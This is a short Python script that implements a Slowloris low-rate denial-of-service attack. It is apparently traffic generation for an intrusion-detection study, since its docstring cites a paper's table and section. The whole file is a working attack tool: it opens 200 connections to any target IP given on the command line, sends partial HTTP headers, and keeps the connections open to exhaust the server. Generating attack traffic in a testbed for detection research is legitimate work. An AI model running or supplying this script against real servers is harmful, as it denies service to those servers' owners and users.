#!/usr/bin/env python3
"""Slowloris low-rate application attack from h4  (Table VII: 8% share, CR 92%).

Opens many TCP connections to the victim's web port and dribbles partial HTTP
headers to hold them open -- low pps, long duration, TCP-heavy (Sec IV.C.2
"Evasion to Low Rate Application Attacks").
"""
from __future__ import annotations
import argparse, socket, time


def run(target_ip: str, duration_s: float = 40.0, port: int = 80, n_conns: int = 200, seed: int = 42) -> None:
    socks = []
    for _ in range(n_conns):
        try:
            s = socket.create_connection((target_ip, port), timeout=2)
            s.send(b"GET /?x HTTP/1.1\r\nHost: victim\r\n")
            socks.append(s)
        except Exception:
            pass
    end = time.time() + duration_s
    while time.time() < end:
        for s in list(socks):
            try:
                s.send(b"X-a: b\r\n")            # keep-alive dribble
            except Exception:
                socks.remove(s)
        time.sleep(10)
    for s in socks:
        try: s.close()
        except Exception: pass


if __name__ == "__main__":
    a = argparse.ArgumentParser(); a.add_argument("target"); a.add_argument("--duration", type=float, default=40.0)
    a.add_argument("--seed", type=int, default=42); n = a.parse_args(); run(n.target, n.duration, seed=n.seed)
